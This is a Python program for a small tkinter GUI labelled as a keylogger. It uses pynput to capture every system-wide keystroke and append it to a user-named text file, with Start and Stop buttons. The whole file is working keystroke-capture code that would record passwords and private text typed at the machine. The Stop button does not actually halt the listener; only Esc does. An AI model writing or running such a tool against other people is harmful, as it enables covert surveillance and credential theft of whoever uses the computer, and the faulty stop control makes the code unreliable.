import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import time

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger with GUI")
        self.root.geometry("400x300")

        self.log_file = ""

        self.label = tk.Label(root, text="Enter the text file name:")
        self.label.pack(pady=10)

        self.entry = tk.Entry(root, width=30)
        self.entry.pack(pady=5)

        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

    def on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                f.write('{0} pressed\n'.format(key.char))
        except AttributeError:
            with open(self.log_file, 'a') as f:
                f.write('{0} pressed\n'.format(key))

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def start_keylogger(self):
        filename = self.entry.get()
        if not filename:
            messagebox.showwarning("Error", "Please enter a valid text file name.")
            return

        self.log_file = filename
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.entry.config(state=tk.DISABLED)

        def start_logging():
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()

        self.keylogger_thread = threading.Thread(target=start_logging)
        self.keylogger_thread.start()

    def stop_keylogger(self):
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.entry.config(state=tk.NORMAL)

if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
